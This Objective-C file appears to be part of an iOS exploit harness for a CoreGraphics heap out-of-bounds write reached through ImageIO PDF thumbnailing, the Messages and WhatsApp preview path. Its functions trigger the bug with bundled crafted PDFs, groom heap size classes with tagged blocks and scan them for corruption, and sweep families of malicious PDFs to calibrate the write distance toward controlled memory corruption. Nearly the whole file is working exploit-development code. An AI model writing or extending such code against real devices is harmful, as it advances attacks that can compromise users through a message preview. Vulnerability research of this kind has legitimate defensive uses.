#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CVE-2026-86950 — CoreGraphics heap OOB write in aa_cache_render, reached
// through CGImageSourceCreateThumbnailAtIndex (the Messages/WhatsApp preview
// path).  Fixed in 26.7.1 — our build is 26.2b1, so it is present.
//
// The local research (Default Project\cve86950) verified the arithmetic: the
// OOB distance is 4*(width_px + K) bytes BEFORE the coverage buffer, with
// width_px = 64*dx — i.e. the write distance is fully controlled by the glyph
// geometry (dx, K), and the write goes BEFORE the row buffer.
//
// This module drives the ImageIO thumbnail path exactly like render.c does:
// no CGContext of our own, no font smoothing calls — ImageIO's internal render
// context is what reaches the vulnerable code.  A canary brackets each call so
// a process that never returns leaves the exact file it died on.
// ===========================================================================
static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
    NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSURL *url = [NSURL fileURLWithPath:path];
    CGImageSourceRef src = CGImageSourceCreateWithURL((CFURLRef)url, NULL);
    if (!src) return [NSString stringWithFormat:@"%@: CGImageSourceCreateWithURL failed", tag];

    int sz = maxPx;
    CFNumberRef px = CFNumberCreate(NULL, kCFNumberIntType, &sz);
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue, px };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k, (const void **)v, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    CFRelease(px);

    AvePost([NSString stringWithFormat:@"%@ BEFORE thumbnail of %@ (max %d px)",
             tag, pdfName, maxPx]);
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
    CFRelease(opts);

    NSString *res;
    if (img) {
        size_t w = CGImageGetWidth(img), h = CGImageGetHeight(img);
        res = [NSString stringWithFormat:@"%@: thumbnail OK %zux%zu (no fault)", tag, w, h];
        AvePost([NSString stringWithFormat:@"%@ canary AFTER thumbnail (survived)", tag]);
        CFRelease(img);
    } else {
        res = [NSString stringWithFormat:@"%@: thumbnail returned NULL (no fault)", tag];
    }
    CFRelease(src);
    return res;
}

// newjail's detection method for a heap OOB that does not fault: pre-map large
// regions with a marker, trigger, then scan for CHANGED words.  If the OOB write
// lands inside one of our regions, the marker changes — that is a proof of
// attacker-controlled corruption, usable even when the process survives.
// Spray a RANGE of size classes with a recognisable tag.  The crash reports
// show the OOB write landing in malloc freelist metadata for allocations of
// ~1.8 KB and ~3.7 KB, so the earlier single-size 8 MB groom could never be
// hit: those blocks live in a different size class entirely.
static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
    const uint64_t MARK = 0xA5A5A5A5A5A5A5A5ULL;
    NSMutableArray *ptrs = [NSMutableArray array];
    NSMutableArray *sizes = [NSMutableArray array];
    // spray a ladder of size classes: the freelist corruption was observed for
    // ~1.8 KB and ~3.7 KB allocations, so cover 128 B .. 8 KB in doubling steps
    // and put `regions` blocks in each class.
    size_t szs[] = { 128, 256, 512, 1024, 2048, 3744, 4096, 8192 };
    for (size_t si = 0; si < sizeof(szs) / sizeof(szs[0]); si++) {
        for (int i = 0; i < regions; i++) {
            void *p = malloc(szs[si]);
            if (!p) break;
            memset(p, 0xA5, szs[si]);
            ((uint64_t *)p)[0] = MARK ^ (uint64_t)(si * 1000003 + i);
            ((uint64_t *)p)[1] = MARK;
            [ptrs addObject:[NSValue valueWithPointer:p]];
            [sizes addObject:[NSValue valueWithSize:szs[si]]];
        }
    }
    int n = (int)ptrs.count;
    AvePost([NSString stringWithFormat:@"86950 groom: %d blocks tagged across %d size "
             @"classes (128 B .. 8 KB)", n, (int)(sizeof(szs) / sizeof(szs[0]))]);

    NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-G%d", n], maxPx);
    AvePost([NSString stringWithFormat:@"86950 groom-render: %@", r]);

    int corrupt = 0;
    for (int i = 0; i < n; i++) {
        void *p = [ptrs[i] pointerValue];
        size_t sz = [sizes[i] sizeValue];
        uint64_t *q = (uint64_t *)p;
        for (size_t off = 0; off + 8 <= sz; off += 8) {
            if (q[0] == (MARK ^ (uint64_t)i) && off == 0) continue;   // our own tag
            if (q[off / 8] != 0xA5A5A5A5A5A5A5A5ULL) {
                AvePost([NSString stringWithFormat:@"86950 CORRUPTION block %d (+%zu) "
                         @"@+%#zx = %#llx", i, sz, off, q[off / 8]]);
                corrupt++;
                if (corrupt > 12) break;
            }
        }
        free(p);
        if (corrupt > 12) break;
    }
    AvePost([NSString stringWithFormat:@"86950 groom scan: %d corrupted words", corrupt]);
    return corrupt;
}

// Sweep the calibrated OOB-distance family (f_dxNN_kMMMM.pdf, one PDF per glyph
// geometry: distance = 4*(64*dx + K) bytes before the coverage buffer).
// R86950_START=<index> lets a later run resume where the previous one stopped,
// so a distance sweep survives the process dying mid-way.
static int ModSweepDistance(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"f_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    NSComparator byDist = ^(NSString *a, NSString *b) {
        // f_dx<NN>_k<MMMM>.pdf — sort by the OOB distance 4*(64*dx + K)
        int dx1 = [[a substringWithRange:NSMakeRange(5, 2)] intValue];
        int k1 = [[a substringWithRange:NSMakeRange(9, 4)] intValue];
        int dx2 = [[b substringWithRange:NSMakeRange(5, 2)] intValue];
        int k2 = [[b substringWithRange:NSMakeRange(9, 4)] intValue];
        int64_t d1 = 4 * (64 * dx1 + k1), d2 = 4 * (64 * dx2 + k2);
        return d1 < d2 ? NSOrderedAscending : (d1 > d2 ? NSOrderedDescending : NSOrderedSame);
    };
    [fam sortUsingComparator:byDist];
    if (!fam.count) {
        AvePost(@"86950 sweep: no f_dx family in the bundle");
        return -1;
    }
    int start = 0;
    const char *se = getenv("R86950_START");
    if (se && *se) start = atoi(se);
    if (start < 0 || start >= (int)fam.count) start = 0;
    AvePost([NSString stringWithFormat:@"86950 sweep: %d PDFs (distances %d..%d bytes), "
             @"starting at index %d", (int)fam.count,
             4 * (64 * [[fam[0] substringWithRange:NSMakeRange(5, 2)] intValue] +
                 [[fam[0] substringWithRange:NSMakeRange(9, 4)] intValue]),
             4 * (64 * [[fam[fam.count - 1] substringWithRange:NSMakeRange(5, 2)] intValue] +
                 [[fam[fam.count - 1] substringWithRange:NSMakeRange(9, 4)] intValue]),
             start]);

    for (int i = start; i < (int)fam.count; i++) {
        NSString *f = fam[i];
        int dx = [[f substringWithRange:NSMakeRange(5, 2)] intValue];
        int k = [[f substringWithRange:NSMakeRange(9, 4)] intValue];
        int dist = 4 * (64 * dx + k);
        NSString *tag = [NSString stringWithFormat:@"86950-D%d", dist];
        // a fresh 8MB-tagged region right before, so a write that survives is
        // still visible: this distance's own canary AND our tag.
        NSString *r = ModThumbPDF(f, tag, 32);
        AvePost([NSString stringWithFormat:@"86950D %@ (dx=%d k=%d dist=%d) -> %@",
                 f, dx, k, dist, r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 SWEEP STOPPED at distance %d (%@)",
                     dist, f]);
            return dist;
        }
    }
    AvePost(@"86950 sweep: every distance rendered without a fault");
    return 0;
}

// A/B sweep for the crash cause: chainctl_dNN.pdf is the SAME composite-glyph
// chain depth with a BENIGN geometry, chaintri_dNN.pdf is the real trigger with
// the same chain.  If the benign ones also kill the process, the death is the
// chain exhausting the raster thread's 544 KB stack and NOT our write.
static void ModSweepChain(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    for (NSString *fam in @[@"chaintri_", @"chainctl_"]) {
        NSMutableArray *files = [NSMutableArray array];
        for (NSString *f in all) {
            if ([f hasPrefix:fam] && [f hasSuffix:@".pdf"]) [files addObject:f];
        }
        [files sortUsingSelector:@selector(compare:)];
        if (!files.count) continue;
        AvePost([NSString stringWithFormat:@"86950 chain-AB family %@: %d PDFs",
                 fam, (int)files.count]);
        for (NSString *f in files) {
            NSString *tag = [NSString stringWithFormat:@"86950-%@%@",
                             [fam isEqualToString:@"chainctl_"] ? @"CTL" : @"TRI",
                             [f substringWithRange:NSMakeRange(fam.length, 3)]];
            NSString *r = ModThumbPDF(f, tag, 32);
            AvePost([NSString stringWithFormat:@"86950AB %@ (%@) -> %@", tag, f, r]);
            if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
                AvePost([NSString stringWithFormat:@"86950AB STOPPED in family %@ on %@",
                         fam, f]);
                return;
            }
        }
        AvePost([NSString stringWithFormat:@"86950 chain-AB family %@: all survived", fam]);
    }
}

// Report what is actually inside the installed bundle, so a stale install is
// visible in the log instead of being guessed at.
static void ModReportBundle(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    int fdx = 0, chain = 0, pdfs = 0;
    for (NSString *f in all) {
        if (![f hasSuffix:@".pdf"]) continue;
        pdfs++;
        if ([f hasPrefix:@"f_dx"]) fdx++;
        if ([f hasPrefix:@"chaintri_"] || [f hasPrefix:@"chainctl_"]) chain++;
    }
    AvePost([NSString stringWithFormat:@"86950 BUNDLE pdfs=%d f_dx=%d chain=%d (chain>0 "
             @"means the A/B build is installed)", pdfs, fdx, chain]);
    if (chain == 0)
        AvePost(@"86950 BUNDLE is STALE: no chain A/B PDFs — the phone runs an older "
                 @"IPA, reinstall the newest one from the desktop");
}

// The family built with the CRASHING font's own structure (nine-level composite
// chain, gen_font.py): k_dxNN_kMMMM.pdf, where DX sweeps the alloca/malloc
// boundary of the coverage buffer and K the write distance in 4096-byte units.
static void ModSweepK(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"k_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    [fam sortUsingSelector:@selector(compare:)];
    if (!fam.count) return;
    AvePost([NSString stringWithFormat:@"86950 K-family: %d PDFs (DX 1..64 x K 0..1024, "
             @"the crashing font's own structure)", (int)fam.count]);
    for (NSString *f in fam) {
        NSString *dist = [f substringWithRange:NSMakeRange(8, 6)];   // NN_kKK -> approx
        NSString *tag = [NSString stringWithFormat:@"86950-K%@", dist];
        NSString *r = ModThumbPDF(f, tag, 32);
        AvePost([NSString stringWithFormat:@"86950K %@ -> %@", f, r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 K-family STOPPED on %@", f]);
            return;
        }
    }
    AvePost(@"86950 K-family: every PDF returned without a fault");
}

// The LEAF family: the crashing font's exact structure (nine-level chain, DX=33
// and DX=31 straddling the alloca/malloc boundary) with the leaf trigger
// coordinate swept 500..32000.  lf_dx33_032000 is a byte-for-byte equivalent of
// the font that actually crashes (only the table-directory offsets differ), so
// this is both a reproduction check and the distance calibration.
static void ModSweepLeaf(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"lf_"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    [fam sortUsingSelector:@selector(compare:)];
    if (!fam.count) return;
    AvePost([NSString stringWithFormat:@"86950 LEAF family: %d PDFs (DX 31/33 x leaf "
             @"500..32000, the crashing font's own structure)", (int)fam.count]);
    for (NSString *f in fam) {
        NSString *tag = [NSString stringWithFormat:@"86950-L%@",
                         [f substringWithRange:NSMakeRange(3, 12)]];
        NSString *r = ModThumbPDF(f, tag, 32);
        AvePost([NSString stringWithFormat:@"86950LF %@ -> %@", f, r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 LEAF STOPPED on %@", f]);
            return;
        }
    }
    AvePost(@"86950 LEAF family: every PDF returned without a fault");
}

// Repeat the calibrated trigger many times in ONE run.  The crash is layout
// dependent (the same leaf=8000 PDF killed the process in one run and rendered
// clean in another), so a single render cannot be calibrated -- a series can.
// R86950_REPEAT=<n> sets the count (default 40).
static void ModRepeatCalibrated(void) {
    NSString *cal = @"lf_dx33_000500.pdf";   // the heap (malloc) side
    NSString *calPath = [[NSBundle mainBundle].bundlePath
                         stringByAppendingPathComponent:cal];
    if (![[NSFileManager defaultManager] fileExistsAtPath:calPath]) return;
    int reps = 40;
    const char *re = getenv("R86950_REPEAT");
    if (re && *re) reps = atoi(re);
    if (reps < 1) reps = 1;
    AvePost([NSString stringWithFormat:@"86950 REPEAT %@ x%d", cal, reps]);
    int survived = 0;
    for (int i = 0; i < reps; i++) {
        NSString *tag = [NSString stringWithFormat:@"86950-R%02d", i];
        NSString *r = ModThumbPDF(cal, tag, 32);
        survived++;
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 REPEAT STOPPED after %d survivors",
                     survived - 1]);
            return;
        }
    }
    AvePost([NSString stringWithFormat:@"86950 REPEAT: all %d renders survived", reps]);
}

NSString *ModCVE86950(void) {
    // The raster-size sweep and the groom only repeat what we already know (the
    // trigger kills the process on the first render), and they burn the whole
    // run before the distance sweep is ever reached.  Order that gets an answer:
    //   control -> distance sweep (R86950_START=<index> to jump to any distance).
    AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
    AvePost(@"86950 start");
    ModReportBundle();
    ModRepeatCalibrated();

    NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
    AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
    if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
        AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
        return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
    }
    // The calibrated trigger for the heap side: DX=33 (malloc, per the generator's
    // own comment: DX <= 31 -> alloca/stack, DX >= 32 -> malloc/heap).  The
    // crash report proves this is where the write lands: the freelist
    // consistency check in xzm_xzone_malloc_freelist_outlined trips on the next
    // allocation, i.e. the previous render's OOB hit malloc metadata.  Groom
    // first so that what it hits is OUR tagged memory instead of metadata.
    NSString *cal = @"lf_dx33_000500.pdf";
    NSString *calPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:cal];
    if ([[NSFileManager defaultManager] fileExistsAtPath:calPath]) {
        AvePost([NSString stringWithFormat:@"86950 CALIBRATED TRIGGER %@ + groom", cal]);
        int corrupt = ModGroomScan(64, 8 << 20, cal, 32);
        if (corrupt) {
            AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED in our tagged regions");
            return [NSString stringWithFormat:@"86950: HEAP CORRUPTION CONFIRMED (%d words "
                    @"changed in the tagged regions - the write is live and lands in "
                    @"memory we control)", corrupt];
        }
        AvePost(@"86950 groom: no changed words in the tagged regions this run");
    }

    ModSweepLeaf();
    ModSweepChain();
    ModSweepK();
    int d = ModSweepDistance();
    if (d > 0)
        return [NSString stringWithFormat:@"86950: the OOB write reached live state at "
                @"distance %d bytes before the coverage buffer (R86950_START to continue)", d];
    AvePost(@"86950 verdict: no distance produced a fault");
    return @"86950: distance sweep completed without a fault";
}
